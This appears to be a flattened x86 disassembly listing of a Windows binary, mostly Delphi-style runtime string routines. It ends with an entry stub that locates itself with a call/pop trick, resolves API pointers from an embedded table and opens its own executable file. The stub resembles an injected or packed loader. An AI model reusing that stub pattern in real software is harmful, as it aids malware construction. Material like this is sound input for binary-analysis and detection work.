lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_4d3050
inc [ esi + 0x1c ]
mov [ esi + 0x10 ] 0xc
mov [ esi + 0x10 ] 0x18
mov [ esi + 0x10 ] 0x24
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
call sub_4d3050
inc [ esi + 0x1c ]
mov ecx [ eax ]
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_4d2964
add [ esi + 0x1c ] 0x5
mov [ esi + 0x10 ] 0x18
dec [ esi + 0x1c ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4d318c
mov [ esi + 0x10 ] 0x18
dec [ esi + 0x1c ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov ecx [ esi ]
mov [ fs : 0x0 ] ecx
mov eax [ ebp - 0x8 ]
test bl bl
je r-xdata
call sub_4d369c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4d36a9
sub_4d2908
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov dl [ ebp + 0xc ]
mov [ ebp - 0x4 ] dl
test dl dl
jle r-xdata
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
mov eax rw-data
call sub_4c517c
push esi
push 0x0
push ebx
call sub_4d2a18
add esp 0xc
add [ ebp - 0x8 ] 0x5
mov eax ebx
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_4d369c
mov [ ebp + 0x8 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4d36a9
sub_4d2964
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
mov [ ebp - 0x10 ] dl
test dl dl
jle r-xdata
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
lea esi [ ebp - 0x30 ]
mov eax rw-data
call sub_4c517c
mov [ esi + 0x1c ] 0x1
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_4d3050
inc [ esi + 0x1c ]
mov [ esi + 0x10 ] 0xc
mov [ esi + 0x10 ] 0x18
mov [ esi + 0x10 ] 0x24
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
call sub_4d3050
inc [ esi + 0x1c ]
mov ecx [ eax ]
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_4d2a74
add [ esi + 0x1c ] 0x4
mov [ esi + 0x10 ] 0x18
dec [ esi + 0x1c ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4d318c
mov [ esi + 0x10 ] 0x18
dec [ esi + 0x1c ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov ecx [ esi ]
mov [ fs : 0x0 ] ecx
mov eax [ ebp - 0x8 ]
test bl bl
je r-xdata
call sub_4d369c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4d36a9
sub_4d2a18
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov dl [ ebp + 0xc ]
mov [ ebp - 0x4 ] dl
test dl dl
jle r-xdata
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
mov eax rw-data
call sub_4c517c
push esi
push 0x0
push ebx
call sub_4d2b28
add esp 0xc
add [ ebp - 0x8 ] 0x4
mov eax ebx
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_4d369c
mov [ ebp + 0x8 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4d36a9
sub_4d2a74
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
mov [ ebp - 0x10 ] dl
test dl dl
jle r-xdata
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
lea esi [ ebp - 0x30 ]
mov eax rw-data
call sub_4c517c
mov [ esi + 0x1c ] 0x1
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_4d3050
inc [ esi + 0x1c ]
mov [ esi + 0x10 ] 0xc
mov [ esi + 0x10 ] 0x18
mov [ esi + 0x10 ] 0x24
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
call sub_4d3050
inc [ esi + 0x1c ]
mov ecx [ eax ]
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_439c4c
add [ esi + 0x1c ] 0x3
mov [ esi + 0x10 ] 0x18
dec [ esi + 0x1c ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4d318c
mov [ esi + 0x10 ] 0x18
dec [ esi + 0x1c ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov ecx [ esi ]
mov [ fs : 0x0 ] ecx
mov eax [ ebp - 0x8 ]
test bl bl
je r-xdata
call sub_4d369c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4d36a9
sub_4d2b28
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov dl [ ebp + 0xc ]
mov [ ebp - 0x4 ] dl
test dl dl
jle r-xdata
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
mov eax rw-data
call sub_4c517c
push esi
push 0x0
push ebx
call sub_4d2b88
add esp 0xc
add [ ebp - 0x8 ] 0x3
mov edx [ esi + 0x18 ]
mov [ ebx + 0x18 ] edx
mov eax ebx
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_4d369c
mov [ ebp + 0x8 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4d36a9
sub_4d2b88
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov dl [ ebp + 0xc ]
mov [ ebp - 0x4 ] dl
test dl dl
jle r-xdata
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
mov eax rw-data
call sub_4c517c
push ebx
push 0x0
push esi
call sub_4d2c08
add esp 0xc
inc [ ebp - 0x8 ]
mov edx ebx
add edx 0x4
lea eax [ esi + 0x4 ]
call sub_4d3050
inc [ ebp - 0x8 ]
mov edx [ ebx + 0x8 ]
mov [ esi + 0x8 ] edx
mov ecx [ ebx + 0xc ]
mov [ esi + 0xc ] ecx
mov eax [ ebx + 0x10 ]
mov [ esi + 0x10 ] eax
mov dl [ ebx + 0x14 ]
mov [ esi + 0x14 ] dl
mov eax esi
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_4d369c
mov [ ebp + 0x8 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4d36a9
sub_4d2c08
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
mov dl [ ebp + 0xc ]
mov [ ebp - 0x4 ] dl
test dl dl
jle r-xdata
mov ebx [ ebp + 0x8 ]
mov eax rw-data
call sub_4c517c
mov eax ebx
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_4d369c
mov [ ebp + 0x8 ] eax
pop ebx
mov esp ebp
pop ebp
retn
call sub_4d36a9
sub_4d2cb8
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
mov [ ebp - 0x8 ] edx
mov ebx eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x1c ] 0xc
xor edx edx
mov [ ebp - 0x4 ] edx
lea edx [ ebp - 0x4 ]
inc [ ebp - 0x10 ]
mov eax ebx
call sub_44be28
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4d31b4
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1c ] 0x18
push eax
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
pop eax
mov [ ebp - 0x1c ] 0xc
inc [ ebp - 0x10 ]
mov edx [ ebp - 0x2c ]
mov [ fs : 0x0 ] edx
pop ebx
mov esp ebp
pop ebp
retn
sub_4d2d24
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
setne al
and eax 0x1
push eax
push [ rw-data ]
cmp [ rw-data ] 0x0
setne dl
and edx 0x1
push edx
cmp [ rw-data ] 0x0
setne cl
and ecx 0x1
push ecx
call sub_40163c
add esp 0x10
pop ebp
retn
sub_4d2d70
push ebp
mov ebp esp
add esp 0xffffffd0
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x20 ] 0xc
mov edx rw-data
lea eax [ ebp - 0x4 ]
call sub_4d3010
inc [ ebp - 0x14 ]
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4d31b4
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x20 ] 0x18
mov edx rw-data
lea eax [ ebp - 0x8 ]
call sub_4d3010
inc [ ebp - 0x14 ]
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
add eax 0x4
call sub_4d31b4
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x20 ] 0x24
mov edx rw-data
lea eax [ ebp - 0xc ]
call sub_4d3010
inc [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4d31b4
dec [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebp - 0x30 ]
mov [ fs : 0x0 ] ecx
mov esp ebp
pop ebp
retn
sub_4d2e38
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov ebx eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x1c ] 0xc
mov esi ebx
mov edx [ esi ]
mov [ ebp - 0x34 ] edx
mov edx [ esi + 0x4 ]
mov [ ebp - 0x30 ] edx
lea ecx [ ebp - 0x34 ]
push [ ecx + 0x4 ]
push [ ecx ]
xor edx edx
mov [ ebp - 0x4 ] edx
lea eax [ ebp - 0x4 ]
inc [ ebp - 0x10 ]
call sub_438584
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4d31b4
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1c ] 0x18
push eax
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
pop eax
mov [ ebp - 0x1c ] 0xc
inc [ ebp - 0x10 ]
mov edx [ ebp - 0x2c ]
mov [ fs : 0x0 ] edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4d2ebc
push ebp
mov ebp esp
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop ebp
retn
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
inc edx
sub_4d2ed7
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
xor ebx ebx
jmp r-xdata
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ecx ] 0x0
jne r-xdata
mov edx [ ecx ]
add ecx 0x4
cmp edx 0xffff
jge r-xdata
cmp edx 0x10ffff
jge r-xdata
inc ebx
test eax eax
je r-xdata
inc ebx
test eax eax
je r-xdata
inc ebx
test eax eax
je r-xdata
test esi esi
jle r-xdata
and dx 0xffff
mov [ eax ] dx
add eax 0x2
jmp r-xdata
mov [ eax ] 0xfffd
add eax 0x2
sub edx 0x10000
mov edi edx
sar edi 0xa
or di 0xd800
mov [ eax ] di
add eax 0x2
and dx 0x3ff
or dx 0xdc00
mov [ eax ] dx
add eax 0x2
jmp r-xdata
dec esi
sub_4d2f70
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx ] 0x0
je r-xdata
xor eax eax
push ebx
call sub_4d2f60
pop ecx
mov eax [ eax + 0x8 ]
jmp r-xdata
pop ebx
pop ebp
retn
sub_4d2f8c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov eax rw-data
call sub_4c517c
cmp esi 0x1
jl r-xdata
lea edx [ ebp - 0x28 ]
push edx
push 0x0
push 0x0
push 0x0
push 0x1
push sub_4d2908
push 0x0
mov [ ebp - 0x18 ] 0xc
xor ecx ecx
mov [ ebp - 0x4 ] ecx
lea edx [ ebp - 0x4 ]
inc [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4d2cb8
lea ecx [ ebp - 0x4 ]
mov ecx [ ecx ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4d2854
push eax
push r-xdata
call sub_4d1c20
add esp 0x24
mov eax ebx
call sub_4d2f70
cmp esi eax
jle r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4d3010
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
mov edx [ ebp - 0x4 ]
xor ecx ecx
mov [ edx ] ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41e5f0
mov ecx [ ebp - 0x28 ]
mov [ fs : 0x0 ] ecx
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4d3050
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
mov edx [ ebp - 0x4 ]
mov ecx [ ebx ]
mov [ edx ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov ecx [ edx ]
cmp [ ecx - 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
inc [ edx - 0x8 ]
cmp ebx [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4d3354
mov ecx [ ebp - 0x28 ]
mov [ fs : 0x0 ] ecx
jmp r-xdata
sub_4d30bc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
mov edx [ ebp - 0x4 ]
xor ecx ecx
mov [ edx ] ecx
cmp ebx 0xffffffff
jne r-xdata
test esi esi
je r-xdata
mov eax esi
call sub_4d2ebc
mov ebx eax
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jle r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4d3380
add ebx ebx
push ebx
push esi
mov ecx [ ebp - 0x4 ]
push [ ecx ]
call sub_4c4cb0
add esp 0xc
sub_4d3128
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
mov edx [ ebp - 0x4 ]
xor ecx ecx
mov [ edx ] ecx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x0
je r-xdata
mov eax ebx
call sub_4d2ebc
mov esi eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4d3380
add esi esi
push esi
push ebx
mov ecx [ ebp - 0x4 ]
push [ ecx ]
call sub_4c4cb0
add esp 0xc
sub_4d318c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_41e66c
test esi 0x1
je r-xdata
push ebx
call sub_4b0180
pop ecx
sub_4d31c8
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x1c ] 0xc
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4d3050
inc [ ebp - 0x10 ]
mov [ ebp - 0x1c ] 0x18
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_41e618
mov [ ebp - 0x1c ] 0x24
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4d31b4
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1c ] 0x30
push eax
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
pop eax
mov [ ebp - 0x1c ] 0x24
inc [ ebp - 0x10 ]
mov edx [ ebp - 0x2c ]
mov [ fs : 0x0 ] edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4d3258
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41e67c
and eax 0xff
cmp eax 0x1
sbb eax eax
neg eax
pop esi
pop ebx
pop ebp
retn
sub_4d3288
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax [ ebx ]
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
pop esi
pop ebx
pop ebp
retn
or eax 0xffffffff
jmp r-xdata
mov eax 0x1
jmp r-xdata
mov eax esi
call sub_4d2f70
push eax
push [ esi ]
mov eax ebx
call sub_4d2f70
push eax
push [ ebx ]
push 0x1
push 0x400
call CompareStringW
add eax 0xfffffffe
sub_4d32e0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push edi
push 0x0
push 0x0
call sub_4c844c
add esp 0x10
mov ebx eax
mov edx ebx
mov eax esi
call sub_4d3380
test ebx ebx
je r-xdata
xor eax eax
push [ ebp + 0x10 ]
push edi
inc ebx
push ebx
push [ esi ]
call sub_4c844c
add esp 0x10
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4d3324
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push ebx
call sub_4d32e0
add esp 0xc
mov eax ebx
pop ebx
pop ebp
retn
sub_4d3354
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx ] 0x0
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov eax [ ebx ]
movzx edx [ eax - 0xa ]
dec edx
jne r-xdata
mov eax ebx
call j_sub_4498a8#2
mov edx ebx
mov eax ebx
call sub_41e604
sub_4d33a0
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
mov [ ebp - 0xc ] edx
mov ebx eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x20 ] 0xc
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4d3050
inc [ ebp - 0x14 ]
mov eax [ eax ]
xor edx edx
mov [ ebp - 0x8 ] edx
lea edx [ ebp - 0x8 ]
inc [ ebp - 0x14 ]
call sub_434c78
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_4d31b4
mov eax [ ebp - 0xc ]
mov [ ebp - 0x20 ] 0x18
push eax
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
pop eax
mov [ ebp - 0x20 ] 0xc
inc [ ebp - 0x14 ]
mov edx [ ebp - 0x30 ]
mov [ fs : 0x0 ] edx
pop ebx
mov esp ebp
pop ebp
retn
sub_4d342c
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x30 ] ecx
mov ebx edx
mov edi eax
mov eax rw-data
call sub_4c517c
mov eax edi
call sub_4d2f70
cmp eax ebx
jl r-xdata
mov [ ebp - 0x1c ] 0xc
xor edx edx
mov [ ebp - 0x4 ] edx
lea edx [ ebp - 0x4 ]
inc [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
call sub_4d31b4
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x1c ] 0x18
push eax
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
pop eax
mov [ ebp - 0x1c ] 0xc
inc [ ebp - 0x10 ]
mov edx [ ebp - 0x2c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
cmp [ ebp - 0x30 ] 0x1
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx 0x1
jge r-xdata
mov esi eax
sub esi ebx
inc esi
cmp esi [ ebp - 0x30 ]
jle r-xdata
mov ebx 0x1
mov [ ebp - 0x1c ] 0x24
mov edx [ edi ]
add ebx ebx
add edx ebx
add edx 0xfffffffe
lea eax [ ebp - 0x8 ]
mov ecx esi
call sub_4d30bc
mov edx eax
inc [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
call sub_4d31b4
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x1c ] 0x30
push eax
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
pop eax
mov [ ebp - 0x1c ] 0x24
inc [ ebp - 0x10 ]
mov edx [ ebp - 0x2c ]
mov [ fs : 0x0 ] edx
mov esi [ ebp - 0x30 ]
sub_4d3514
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4d3050
inc [ ebp - 0xc ]
mov eax [ eax ]
call sub_435884
push eax
dec [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
pop eax
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
pop ebx
mov esp ebp
pop ebp
retn
sub_4d3564
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x20 ] 0xc
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4d3010
inc [ ebp - 0x14 ]
mov [ ebp - 0x20 ] 0x18
mov [ ebp - 0x20 ] 0x24
xor ecx ecx
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x8 ]
inc [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_41e62c
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_4d31b4
mov eax [ ebp - 0xc ]
mov [ ebp - 0x20 ] 0x30
push eax
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
pop eax
mov [ ebp - 0x20 ] 0x24
inc [ ebp - 0x14 ]
mov edx [ ebp - 0x30 ]
mov [ fs : 0x0 ] edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4d3600
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x20 ] 0xc
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4d3128
inc [ ebp - 0x14 ]
mov [ ebp - 0x20 ] 0x18
mov [ ebp - 0x20 ] 0x24
xor ecx ecx
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x8 ]
inc [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_41e62c
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_4d31b4
mov eax [ ebp - 0xc ]
mov [ ebp - 0x20 ] 0x30
push eax
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
pop eax
mov [ ebp - 0x20 ] 0x24
inc [ ebp - 0x14 ]
mov edx [ ebp - 0x30 ]
mov [ fs : 0x0 ] edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
_start
push ebp
mov ebp esp
sub esp 0x574
mov [ ebp - 0x12c ] 0x0
mov [ ebp - 0x154 ] 0x0
mov [ ebp - 0x284 ] 0x0
call sub_51c27d
nop
nop
pop [ ebp - 0x12c ]
mov eax [ ebp - 0x12c ]
sub eax 0x24c
mov [ ebp - 0x284 ] eax
mov [ ebp - 0x540 ] 0x0
mov [ ebp - 0x2a8 ] 0x0
mov [ ebp - 0x420 ] 0x0
mov [ ebp - 0x144 ] 0x0
mov ecx [ ebp - 0x284 ]
mov edx [ ecx ]
mov [ ebp - 0x420 ] edx
mov eax [ ebp - 0x284 ]
add eax 0x4
mov [ ebp - 0x140 ] eax
mov ecx [ ebp - 0x140 ]
push ecx
call sub_51ce90
add esp 0x4
call sub_51d050
mov [ ebp - 0x54c ] eax
mov edx [ ebp - 0x140 ]
push edx
mov eax [ ebp - 0x54c ]
push eax
call sub_51d080
add esp 0x8
mov [ ebp - 0x540 ] eax
mov ecx [ ebp - 0x284 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x144 ] edx
mov [ ebp - 0x548 ] 0x0
mov [ ebp - 0x53c ] 0x0
mov eax [ ebp - 0x284 ]
add eax 0xa0
mov [ ebp - 0x2a4 ] eax
mov ecx [ ebp - 0x284 ]
add ecx 0x1f0
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x284 ]
add edx 0xd0
mov [ ebp - 0x128 ] edx
mov [ ebp - 0x124 ] 0x0
mov [ ebp - 0x150 ] 0x0
mov eax [ ebp - 0x12c ]
sub eax 0x1
mov [ ebp - 0x12c ] eax
mov ecx [ ebp - 0x12c ]
mov edx [ ecx ]
mov [ ebp - 0x154 ] edx
jmp rwxdata
mov [ ebp - 0x2a0 ] 0x0
mov [ ebp - 0x41c ] 0x0
mov [ ebp - 0x418 ] 0x0
mov [ ebp - 0x13c ] 0x0
mov [ ebp - 0x14c ] 0x0
mov [ ebp - 0x29c ] 0x0
mov [ ebp - 0x538 ] 0x0
mov [ ebp - 0x544 ] 0x0
mov [ ebp - 0x280 ] 0x0
mov [ ebp - 0x28c ] 0x0
mov [ ebp - 0x55c ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x534 ] 0x0
mov [ ebp - 0x268 ] 0x0
mov [ ebp - 0x414 ] 0x0
mov [ ebp - 0x298 ] 0x0
mov edx [ ebp - 0x284 ]
add edx 0x1f0
mov [ ebp - 0x124 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax ]
mov [ ebp - 0x2a0 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x41c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x418 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0xc ]
mov [ ebp - 0x13c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x14 ]
mov [ ebp - 0x29c ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x538 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x1c ]
mov [ ebp - 0x544 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x20 ]
mov [ ebp - 0x280 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x28c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x28 ]
mov [ ebp - 0x55c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x2c ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x30 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x34 ]
mov [ ebp - 0x534 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x38 ]
mov [ ebp - 0x268 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x3c ]
mov [ ebp - 0x414 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x40 ]
mov [ ebp - 0x298 ] eax
mov [ ebp - 0x264 ] 0x0
mov ecx [ ebp - 0x284 ]
add ecx 0x20
mov [ ebp - 0x264 ] ecx
mov [ ebp - 0x2b4 ] 0x0
mov [ ebp - 0x18 ] 0x0
push 0x103
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x41c ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x1
push 0x80000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
